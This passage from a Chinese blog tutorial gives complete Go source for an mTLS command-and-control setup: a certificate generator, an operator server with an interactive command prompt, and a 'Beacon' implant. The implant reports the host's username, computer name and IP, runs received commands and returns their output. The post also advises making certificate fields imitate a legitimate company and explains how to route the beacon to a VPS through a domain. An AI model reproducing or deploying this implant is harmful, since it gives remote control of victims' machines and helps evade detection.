:= x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &amp;caPriv.PublicKey, caPriv)  </span><br><span class="line">    caCert, _ := x509.ParseCertificate(caCertDER)  </span><br><span class="line">    saveCert(<span class="string">&quot;ca.pem&quot;</span>, caCertDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;ca-key.pem&quot;</span>, caPriv)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 生成server的私钥和证书，用CA的私钥签发server的证书  </span></span><br><span class="line">    servPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    servTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization: []<span class="type">string</span>&#123;orgName&#125;,  </span><br><span class="line">          Country:      []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Locality:     []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage:    x509.KeyUsageDigitalSignature,  </span><br><span class="line">       ExtKeyUsage: []x509.ExtKeyUsage&#123;x509.ExtKeyUsageServerAuth&#125;,  </span><br><span class="line">       IPAddresses: []net.IP&#123;  </span><br><span class="line">          net.IPv4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">3</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">203</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">2</span>), <span class="comment">// &lt;-- RFC 5737 文档公网  </span></span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    servDER, _ := x509.CreateCertificate(rand.Reader, servTmpl, caCert, &amp;servPriv.PublicKey, caPriv)  </span><br><span class="line">    saveCert(<span class="string">&quot;server.pem&quot;</span>, servDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;server-key.pem&quot;</span>, servPriv)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 生成client的私钥和证书，用CA的私钥签发client的证书  </span></span><br><span class="line">    cliPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    cliTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization: []<span class="type">string</span>&#123;orgName&#125;, <span class="comment">// 固定值  </span></span><br><span class="line">          Country:      []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Locality:     []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage:    x509.KeyUsageDigitalSignature,  </span><br><span class="line">       ExtKeyUsage: []x509.ExtKeyUsage&#123;x509.ExtKeyUsageClientAuth&#125;, <span class="comment">// 必须为 ClientAuth    &#125;  </span></span><br><span class="line">    cliDER, _ := x509.CreateCertificate(rand.Reader, cliTmpl, caCert, &amp;cliPriv.PublicKey, caPriv)  </span><br><span class="line">    saveCert(<span class="string">&quot;client.pem&quot;</span>, cliDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;client-key.pem&quot;</span>, cliPriv)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomBytes</span><span class="params">(n <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;  </span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">byte</span>, n)  </span><br><span class="line">    rand.Read(b)  </span><br><span class="line">    <span class="keyword">return</span> b  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveCert</span><span class="params">(name <span class="type">string</span>, der []<span class="type">byte</span>)</span></span> &#123;  </span><br><span class="line">    f, _ := os.Create(name)  </span><br><span class="line">    pem.Encode(f, &amp;pem.Block&#123;Type: <span class="string">&quot;CERTIFICATE&quot;</span>, Bytes: der&#125;)  </span><br><span class="line">    f.Close()  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveKey</span><span class="params">(name <span class="type">string</span>, key *ecdsa.PrivateKey)</span></span> &#123;  </span><br><span class="line">    b, _ := x509.MarshalECPrivateKey(key)  </span><br><span class="line">    f, _ := os.Create(name)  </span><br><span class="line">    pem.Encode(f, &amp;pem.Block&#123;Type: <span class="string">&quot;EC PRIVATE KEY&quot;</span>, Bytes: b&#125;)  </span><br><span class="line">    f.Close()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码用来给测试环境快速生成三套TLS文件。</p>
<ol>
<li>自签名的 CA 证书&#x2F;密钥（ca.pem&#x2F;ca-key.pem）</li>
<li>服务器证书&#x2F;密钥（server.pem&#x2F;server-key.pem），由CA签发</li>
<li>客户端证书&#x2F;密钥（client.pem&#x2F;client-key.pem），由CA签发</li>
</ol>
<p>这里要说一下IP地址写进证书属于 <strong>Subject Alternative Name（SAN）</strong> 的一种写法，证书SAN里的IP是 “我提供的身份”，它的用处是只要对端用这几个IP地址中的任何一个来连我，就算名称匹配，握手继续。</p>
<p>比如说client-&gt;server，server的证书IP SAN是 <code>192.168.3.1（server真实的ip地址）</code>，client对 <code>192.168.3.1</code> 发起连接，则client不报错；若server的证书IP SAN是 <code>192.168.3.2</code>，client对 <code>192.168.3.1</code> 发起连接，因为 <code>192.168.3.1</code> 不符合server的证书IP SAN，故client报证书验证错误。server-&gt;client的也是同理。下图就是client验证server证书失败后的结果。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/18-55-58-c5bda708572da69902f97196e3fd1bae-20250913185558-e101c4.png"></p>
<p>其余值得说明的是Subject字段，这里包含了Country、Organization 、Locality、 Province等相关信息，可以将这些信息尽可能贴近实际生活，看起来像正规公司出品的证书。</p>
<h3 id="2-2-2-Server"><a href="#2-2-2-Server" class="headerlink" title="2.2.2 Server"></a>2.2.2 Server</h3><p><code>server.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/tls&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;mtls/utils&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    listenAddr = <span class="string">&quot;192.168.3.1:9443&quot;</span>  </span><br><span class="line">    caCert     = <span class="string">&quot;ca.pem&quot;</span>  </span><br><span class="line">    serverCert = <span class="string">&quot;server.pem&quot;</span>  </span><br><span class="line">    serverKey  = <span class="string">&quot;server-key.pem&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    ln, err := ListenerStart(listenAddr)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;listener start: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;mTLS listener started on %s&quot;</span>, listenAddr)  </span><br><span class="line">    acceptConnections(ln)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 启动 mTLS 监听器  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> (net.Listener, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="comment">// 加载服务器证书  </span></span><br><span class="line">    cert, err := tls.LoadX509KeyPair(serverCert, serverKey)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// 加载CA并放入池  </span></span><br><span class="line">    caPEM, err := os.ReadFile(caCert)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    pool := x509.NewCertPool()  </span><br><span class="line">    <span class="keyword">if</span> !pool.AppendCertsFromPEM(caPEM) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to parse CA certificate&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// TLS配置：强制双向TLS 1.3  </span></span><br><span class="line">    tlsConfig := &amp;tls.Config&#123;  </span><br><span class="line">       Certificates: []tls.Certificate&#123;cert&#125;,  </span><br><span class="line">       ClientAuth:   tls.RequireAndVerifyClientCert, <span class="comment">//mTLS与TLS的关键区别  </span></span><br><span class="line">       ClientCAs:    pool,  </span><br><span class="line">       MinVersion:   tls.VersionTLS13,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> tls.Listen(<span class="string">&quot;tcp&quot;</span>, addr, tlsConfig)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 接受新连接  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">acceptConnections</span><span class="params">(listener net.Listener)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       rawConn, err := listener.Accept()  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="comment">// 监听器被关闭  </span></span><br><span class="line">          <span class="keyword">if</span> opErr, ok := err.(*net.OpError); ok &amp;&amp; opErr.Op == <span class="string">&quot;accept&quot;</span> &#123;  </span><br><span class="line">             <span class="keyword">break</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          log.Printf(<span class="string">&quot;accept error: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;new connection from %s&quot;</span>, rawConn.RemoteAddr())  </span><br><span class="line">       <span class="keyword">go</span> handleConnection(rawConn)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 处理单条连接  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn net.Conn)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// 1. 读一条Beacon输出  </span></span><br><span class="line">       data, err := utils.ReadFrame(conn)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err != io.EOF &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read error: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;output: %s\n&quot;</span>, <span class="type">string</span>(data))  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 2. 从标准输入读一条命令  </span></span><br><span class="line">       fmt.Print(<span class="string">&quot;Cmd&gt;&gt;&gt; &quot;</span>)  </span><br><span class="line">       cmdLine, _ := bufio.NewReader(os.Stdin).ReadString(<span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line">       cmdLine = strings.TrimRight(cmdLine, <span class="string">&quot;\r\n&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cmdLine == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 3. 下发命令  </span></span><br><span class="line">       <span class="keyword">if</span> err := utils.WriteFrame(conn, []<span class="type">byte</span>(cmdLine)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;write error: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ListenerStart</strong>：读取server的私钥和证书以及CA的证书，完成TLS的配置（其中），<code>ClientAuth: RequireAndVerifyClientCert</code> 是 <strong>mTLS与单向TLS唯一区别</strong>：握手阶段服务器会发 。<strong>CertificateRequest</strong>，客户端必须回证书且通过 <code>ClientCAs（CA验证）</code> 校验链。完成配置之后就可以使用tls.Listen快速地创建监听器了。</p>
<p><strong>acceptConnections</strong>：每来一条连接就创建一个goroutine，由handleConnection来处理。</p>
<p><strong>handleConnection</strong>：交互式shell，可以下发命令和读取Beacon回传的数据，其中利用到了工具函数的 <code>ReadFrame</code> 和 <code>WriteFrame</code> 从socket中读写数据，支持8192B分块，大回显也不会炸内存。</p>
<p>看看执行效果，下图server控制输入ipconfig命令后的回显</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/21-07-45-f6913f74998b6f77038c1c5fd9472ce1-20250913210744-fd095b.png"></p>
<h3 id="2-2-3-Beacon"><a href="#2-2-3-Beacon" class="headerlink" title="2.2.3 Beacon"></a>2.2.3 Beacon</h3><p><code>beacon.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/tls&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/rand/v2&quot;</span>    </span><br><span class="line">    <span class="string">&quot;mtls/utils&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>    <span class="comment">// 长度前缀读写函数保持原样  </span></span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:9443&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  </span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    cert, _ := tls.LoadX509KeyPair(<span class="string">&quot;client.pem&quot;</span>, <span class="string">&quot;client-key.pem&quot;</span>)  </span><br><span class="line">    caPEM, _ := os.ReadFile(<span class="string">&quot;ca.pem&quot;</span>)  </span><br><span class="line">    pool := x509.NewCertPool()  </span><br><span class="line">    pool.AppendCertsFromPEM(caPEM)  </span><br><span class="line">    conn, err := tls.Dial(<span class="string">&quot;tcp&quot;</span>, beaconProfile.CallBackAddress, &amp;tls.Config&#123;  </span><br><span class="line">       Certificates: []tls.Certificate&#123;cert&#125;,  </span><br><span class="line">       RootCAs:      pool,  </span><br><span class="line">       ServerName:   <span class="string">&quot;192.168.3.1&quot;</span>,  </span><br><span class="line">       MinVersion:   tls.VersionTLS13,  </span><br><span class="line">    &#125;)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;dial: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. 先给服务器发个“上线包  </span></span><br><span class="line">    data, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       err = utils.WriteFrame(conn, []<span class="type">byte</span>(err.Error()))  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := utils.WriteFrame(conn, data); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. 循环等命令  </span></span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       cmdLine, err := utils.ReadFrame(conn)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err == io.EOF &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;server gone&quot;</span>)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       cmd := strings.TrimRight(<span class="type">string</span>(cmdLine), <span class="string">&quot;\r\n&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cmd == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 3. 执行  </span></span><br><span class="line">       <span class="keyword">var</span> out []<span class="type">byte</span>  </span><br><span class="line">       <span class="keyword">if</span> strings.Contains(cmd, <span class="string">&quot; &quot;</span>) &#123;  </span><br><span class="line">          <span class="comment">// 带参数  </span></span><br><span class="line">          parts := strings.Fields(cmd)  </span><br><span class="line">          out, _ = exec.Command(parts[<span class="number">0</span>], parts[<span class="number">1</span>:]...).CombinedOutput()  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          out, _ = exec.Command(cmd).CombinedOutput()  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 4. 回结果（长度前缀帧）  </span></span><br><span class="line">       <span class="keyword">if</span> err := utils.WriteFrame(conn, out); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;write: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mTLS Beacon的逻辑比较简单，主体思路就是读取client的私钥和证书以及CA的证书，配置号TLS的配置，使用 <code>tls.Dial</code> 发起连接。如果连接成功就给server发送一个metaData包，表明我活了，之后进入循环。如果server下发命令，则可以从socket读取，并将结果写入socket，同样用到了工具函数的 <code>ReadFrame</code> 和 <code>WriteFrame</code> 从socket中读写数据。</p>
<h2 id="2-3-流量分析"><a href="#2-3-流量分析" class="headerlink" title="2.3 流量分析"></a>2.3 流量分析</h2><p>完成TCP三次握手，毕竟TLS使用TCP报文来封装，之后就是服务器会根据SNI中的主机名来选择相应的证书和密钥，以完成TLS握手过程。其余部分就是被加密后的应用数据。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/21-57-37-b1c55b2bbffd6c818930e8f5364c3fcf-20250913215736-2da51d.png"></p>
<p>补充一下，mtls beacon是可以通过域名去访问到server的。server.go的listenAddr修改为0.0.0.0，端口修改为可以出&#x2F;入流量的端口，这个跟vps的安全组策略有关。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-25-51-5e48a3df1733f862757ed15836e5673a-20250914142551-040eb1.png"></p>
<p>beacon.go的CallBackAddress修改为A记录域名（指向你的vps公网IP），注意要删除 <code>ServerName</code>，不然client验证server的证书会失败。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-24-17-54bf78c9b9c3b32f8cf6522670a9c92c-20250914142416-4df6bc.png"></p>
<p>运行beacon，可以看到首先查询DNS服务器A记录域名所指向的ip地址是多少，也就是询问vps的ip是多少。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-07-41-8bd72733ad079b0887786bf7a906939a-20250914140740-557e8a.png"></p>
<p>之后就是正常的tcp三次握手（太多tcp报文了，分不清），验证证书与交换密钥，以完成TLS握手过程。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-11-31-5d23a166106825908981bfe68f9daad1-20250914141131-542796.png"></p>
<p>能够正常执行命令与回传结果。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-29-13-2ca62408e79312aaedf1ca707820d645-20250914142912-f5cbaa.png"></p>
